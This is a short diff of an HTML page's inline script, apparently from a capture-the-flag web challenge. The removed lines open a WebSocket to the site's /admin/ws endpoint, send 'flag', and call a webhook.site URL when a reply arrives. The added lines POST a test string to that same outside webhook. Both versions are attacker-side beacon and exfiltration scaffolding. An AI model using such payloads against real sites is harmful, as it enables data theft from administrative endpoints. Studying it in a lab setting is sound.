@@ -4,13 +4,11 @@
 </head>
 <body>
   <script>
-      const ws = new WebSocket(`ws://${window.location.host}/admin/ws`);
-    
-      ws.onopen = () => ws.send("flag");
-    
-      ws.onmessage = (event) => {
-        fetch("https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6");
-      };
+      fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
+        method: `POST`,
+        mode: `no-cors`,
+        body: `salam1`
+      });
   </script>
 </body>
 </html>
